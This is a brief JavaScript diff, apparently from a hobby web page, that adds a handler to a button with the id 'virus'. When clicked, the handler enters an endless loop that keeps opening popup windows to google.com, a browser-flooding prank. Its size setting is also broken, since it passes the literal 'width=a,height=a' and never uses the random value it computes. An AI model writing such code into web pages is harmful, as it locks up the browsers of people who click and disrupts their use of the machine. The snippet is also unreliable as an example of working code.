@@ -24,3 +24,14 @@ window.onload = function(){
         console.log('そんなブラウザは知らん');
     }
 }
+
+document.getElementById("virus").onclick = function(){
+    var min = 150 ;
+    var max = 300 ;
+
+
+    while(true){
+        var a = Math.floor( Math.random() * (max + 1 - min) ) + min
+        window.open("https://www.google.com",Math.random(),"width=a,height=a");
+    }
+}
